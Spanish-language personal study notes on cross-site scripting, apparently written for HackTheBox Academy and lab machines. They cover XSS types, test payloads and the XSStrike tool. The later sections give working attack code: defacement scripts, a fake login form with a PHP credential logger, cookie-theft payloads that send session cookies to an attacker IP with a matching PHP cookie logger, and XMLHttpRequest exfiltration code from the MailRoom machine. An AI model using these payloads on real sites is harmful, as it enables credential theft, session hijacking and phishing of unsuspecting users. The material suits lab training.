	#### XSS
	### Definicion
XSS utiliza la mala sanitizacioon del input del usr para escribir codigo JavaScript en la pagina y que sea ejecutado del lado del cliente.
El funcionamiento es del lado del navegado. Si un usuario inserto codigo javascript, si otro ve ese codigo seria interpretado generando la ejecucion del mismo.
Hay tre tipos de XSS:
	-> Stored XSS
	-> RReflected XSS
	-> DOM-based XSS
Si bien los XSS hoy en dia no suelen salir del navegador y ejecutar codigo en el sistema, una vulnerrabilidad del navegador podria permitir que esto ocurra. Aun si, el impacto dentro del navegador puede ser alto en caso de robor de cookies por ejemplo.

----------      ----------      ----------      ----------
	### Stored XSS
Es la mas critica por la persistencia que se genera. El codigo, en estos casos, es almacenado een la base de datos, generando que siempre que se muestre la pagina donde see encuentrra el codigo, este sera interpretado.
La eliminacion del codigo no es simple, debe eliminarse directamente del backend.

##Testing payloads
<script>alert(window.origin)</script>
#Este prueba deberia general un cartel el navegador
-> Es simple de usar y es un payload basico que puede funcionar
-> Este payload puede ser bloqueado facilmente

<script>print()</script>
#Esta prueba nos mosotraria la vista previa de impresion de una hoja
-> Este puede no ser bloqueado

<script>alert(document.cookie)</script>
#Muestra la cookie

----------      ----------      ----------      ----------
	### Reflected XSS - No persistente
Esto se da cuando nuestro XSS impacta en el backend generando que haya una respuesta sin filtrar o sanitizarr.
Esto podemos probarlo cuando al ingrresar un input se noos devuelve un mensaje de error o de exito. Generalmente, si intentamos correr el <script></script> del ejemplo anterior, este funcionaria y en el mensaje de error o exito podriamos ver '' en donde iria nuestro output.
-> Al no ser persistente, si la pagina se reecarga el mensaje no volveria a aparecer.
Al no ser persistente, si queremos realizar el ataque a un usuario debemoos prestar atencion como se manda nueestro input. Si es un GET este viaja en la URL, con solo mandarle la URL y el GET XSS el usuario estaria ejecutando el XSS.

----------      ----------      ----------      ----------
	### DOM XSS - No persistente
En reflected el XSS es enviado al servidor, en DOM, el XSS es interpretado de forma completa por el cliente mediante JavaScript.
Cuando nuestro input es agregado en la URL pero con un # (ej: ?#task=test) quiere decir que el input es procesado en el lado del cliente mediante JavaScript y no llega al backend.
El problema se da cuando sink escribe nuestro input en un objeto DOM sin sanitizar. 
-> Source y sink: SOURCE es el objeto JavaScript que toma nuestro imput (parametro url, input field, etc); Por otro lado SINK escribe un objeto DOM con el input que recibio SOURCE.

Funciones coomunes para escibir objetos DOM
	document.write()
	DOM.innerHTML
	DOM.outerHTML
Algunas funciones de la libreria JQuery que escriben DOM
	add()
	after()
	append()

Por lo gral estas funciones pueden ser vistas en un script.js siendo llamadas como .innerHTML, .outerHTML, etc

Para estos casos es recomendable usar otrro tipo de payloads de pruebba
<img src="" onerror=alert(window.origin)>
#Este payload crea una nueva imagen HTML que posee el atributo onerror que se ejecuta cuando la imagen no es encontrada. Funciona como el <script>
"></select><img%20src=1%20onerror=alert(1)>
#Simlar al anterior. Crea una alerta

----------      ----------      ----------      ----------
	### Blind XSS
Este tipo de XSS esta explicado en la parte de session hijacking despues de phishing

----------      ----------      ----------      ----------
	### Descubrimiento de XSS
Todo lo anterior puedee ser una forrma de entender e intentar descubir un XSS. Aun asi existen erramientas que nos ayudan a encontrarlo.
Algunos tools que sirven ademas de Burp pro y Nessus son XSS Strike, Brute XSS, and XSSer.

## XSS Strike
git clone https://github.com/s0md3v/XSStrike.git
pip install -r requirements.txt
python xsstrike.py -u "URL"
-> La url debe contener los parmetros (?xx=xx)

## Testeos manuales
Por payloads consultar: PayloadAllTheThings o PayloadBox
Aun asi, no siempre los payloads van a servirnos y se puede perder bastante tiempo probando uno a uno.
La forma manual mas eficiente es revisar el codigo para entender como es tratado nuestro input y asi crear un payload. De esta forma, evitamos la perdida de tiempo que puede llegar a causar payloads basicos y conocidos como a su vez tools ya que los desarrolladores corren en sus paginas web tools para identificar vulnerabilidades y asi arreglarlo.

----------      ----------      ----------      ----------
	### Defacing
Hace referencia a desfigurar un sitio web para que todos los usuarios lo vean de esa forma. Esto se logra mediante codigo JavaScript que permita modificar la pagina para que luzca como queremos.
Para cambiar el aspecto se suelen utilizar:

<script>document.body.style.background = "#141d2b"</script>
#Color de fondo -> document.body.style.background
#En este caso se uso el codigo del color, tambien puede definirse como '= "black"'

<script>document.body.background = "https://i.imgur.com/lzwrGiH.jpeg"</script>
#Fondo -> document.body.background
#Una imagen

<script>document.title = 'Nuevo titulo'</script>
#Título de la página -> document.title
#El titulo es lo que aparece en la pestana

document.getElementById("todo").innerHTML = "New Text"
#Texto de página -> <DOM>.innerHTML
#Puede ser referenciando el ID del html
document.getElementsByTagName('body')[0].innerHTML = "New Text"
#Aunque tambien puede ser realizado mediante el tag name tal que sea body, h1, etc
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
#Este es un payload que con JQuery realizamos el cambio del body especificandole varios cambios que queremos como la foto, titulo, etc.

----------      ----------      ----------      ----------
	### Phishing
Un XSS puede terminar en un phishing. Teniendo en cuenta el defacing de la seccion anterior, podria modificarse la pagina para que con el codigo que sigue a continuacion parezca un login

<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
#En el login de arriba hay una seccion para establecer nuestra IP. Si esa IP es dirigida a un server que controlamos, la persona accederia al mismo y nosotros podriamos ver lo que nos mando (en este caso usr y passwd)\

document.getElementById('<urlform>').remove();
#En el caso de querer eliminar algo de la pagina la cual modificamos se puede realizar mediante esto con el ID

<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/index.php");
    fclose($file);
    exit();
}
?>
<html>
<body><h1>Hello Friend</h1></body>
</html>
#Este codigo crea un index.php donde el usuario puede "aterrizar". A su vez, las credenciales se estan guardando en un archivo llamado creds.txt generando que todos los usr que se logueen aca guarden sus creddenciales en ese archivo

----------      ----------      ----------      ----------
	### Session hijacking
La sesion de los usuario es mantenida en la mayoria de las aplicaciones web mediante cookies. Esto permite al usuario poder continuar con su sesion en diferentes momentos y sesiones del navegador.
Sabiendo esto, si una persona maliciosa puede acceder a las cookies de sesion de un usuario este podria ser impersonado por la persona maliciosa.
Esta tecnica puede ser explotada mediante los tipos de XSS anteriores pero a continuacion se va a explicar con Blind XSS.

	## Blind XSS
Un blind XSS ocurre cuando aprovechamos la vulnerabilidad en una pagina a la cual no tenemos acceso. Se da cuando explotamos la vulnerabilidad en una pagina en la que solo se tiene acceso por usuario.
Se puede dar mediante el uso de:
-> Contact Forms
-> Reviews
-> User Details
-> Support Tickets
-> HTTP User-Agent header
En todos los casos anteioes se da la particularidad de que no tenemos acceso para saber de forma concreta como se maneja nuestro input y tampoco tenemos acceso a poder probar con alerts, etc.

<script src=http://OUR_IP/<custom.name>></script>
"><script src="https://<OUR_I P>/<custom.name>"></script>
"><script src=//<custom.subdomain>.xss.ht></script>
<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
#Al no poder saber si el payload funciono o no se puede referenciar un source que controlemos, de esta forma sabemos si existe o no una coneccion
#Si queremos conocer el campo el cual es injyectable solo debemos cambiar el /script por algo que podamos diferenciar


document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
#Payloads que pueden usarse para obtener la cookie de sesion
#Estos payloads deberian ir en nuestro servidor dentro del archivo que se consulta en el XSS

<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
#Con el codigo PHP de arriba podriamos crear un archivo donde se van almacenando las difierentes cookies de las personas.
#Este codigo php es el index.php que se ve en el payload de mas arriba

	##Maquina MailRoom
var url = window.location.href
var req = new XMLHttpRequest()
req.open("GET", "http://<ip>/?resp=" + btoa(url), true);
req.send()
#De esta forma recibiriamos en la request el nombre del archivo actual en el que estamos

var req = new XMLHttpRequest()
req.open("GET", "http://staff-review-panel.mailroom.htb", false);
req.send()
var exfil_req = new XMLHttpRequest()
exfil_req.open("GET", "http://10.10.14.6/?resp=" + btoa(req.responseText), true);
exfil_req.send()
#Se intenta enviar el contenido de una pagina en particular a la cual no tenemos acceso.


### Open redirect to XSS
-> Dudas de open redirect en openredirect.txt
fetch("<ip>/recurso.js".then(r=>r.text().then(eval))) | base64 -w 0:echo
#Obtengo en base64 el payload para que se consulte el recurso en la ip que se determino
javascript(eval(atob("base64string"))) -> En caso de que no funcione probar el siguiente
javascript:document.body.innerHTML='<script src="http://<ip>/recurso.js"></script>' -> En caso de que no funcione, probar url encodeando desde document o etc
#Permite hacer un XSS realizando la consulta del base64 (opc 1) o con innerhtml (opc 2). En el recurso deberia estar el XSS que queremos que sea interpretado (ej. alert(XSS))

